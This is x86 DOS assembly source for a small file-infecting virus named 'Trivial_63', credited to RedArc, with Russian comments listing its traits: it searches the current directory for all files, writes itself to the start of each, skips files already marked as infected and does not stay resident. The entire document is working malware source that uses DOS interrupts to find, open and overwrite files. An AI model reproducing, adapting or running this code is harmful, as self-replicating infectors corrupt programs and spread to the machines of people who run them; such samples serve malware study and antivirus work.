; Trivial_63 (c) by RedArc

;■ поиск и инфицирование всех-файлов в текущем каталоге
;■ инфицирование в начало
;■ не исполняет код программы-жертвы
;■ не портит код жертвы, что делает возможным его лечение
;■ не заражает повторно уже инфицированные программы
;■ не резидентный

Model Tiny
.code
org 100h
start:
       xchg cx,ax
       mov ah,4eh
       mov dx,(virlength-4)+100h
@0:
       int 21h
       jnb @1
       ret
@1:
       mov ax,3d02h
       cwd
       mov dl,9eh
       int 21h
       xchg bx,ax
       mov ah,3fh
       push sp
       pop cx
       mov dx,virlength+100h
       int 21h
       cmp byte ptr ds:[virlength+100h],091h
       je @2
       add ax,virlength
       push ax
       xor cx,cx
       mul cx
       mov ah,42h
       int 21h
       mov dx,si
       pop cx
       mov ah,40h
       int 21h
@2:
       mov ah,4fh
       jmp short @0
db '*.*',0h
virlength equ $-start
end start
